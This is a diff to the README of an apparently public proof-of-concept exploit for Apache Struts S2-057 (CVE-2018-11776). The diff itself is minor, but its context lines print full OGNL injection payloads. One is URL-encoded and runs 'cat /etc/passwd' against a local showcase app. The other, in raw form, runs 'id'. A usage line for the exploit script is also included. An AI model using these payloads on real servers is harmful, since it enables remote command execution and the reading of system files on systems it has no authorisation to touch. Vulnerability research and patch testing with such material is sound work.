@@ -25,11 +25,11 @@ A simple exploit for Apache Struts RCE S2-057 (CVE-2018-11776)
 
 
 # Usage
-`exploit.py <url> <command> <action> <payload>`
+`python exploit.py <url> <command> <action> <payload>`
 
 # Example
 ```Shell
-$ python exploit.py "http://127.0.0.1:8080/showcase" "cat /etc/passwd" "actionChain1.action" 3
+python exploit.py "http://127.0.0.1:8080/showcase" "cat /etc/passwd" "actionChain1.action" 3
 
 === Tring payload-3 ===
 [*] Generated EXP: http://127.0.0.1:8080/showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action
@@ -89,7 +89,3 @@ ${
 (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
 ```
 
-Result:
-
-![](2.png)
-# CVE-2018-11776-PoC
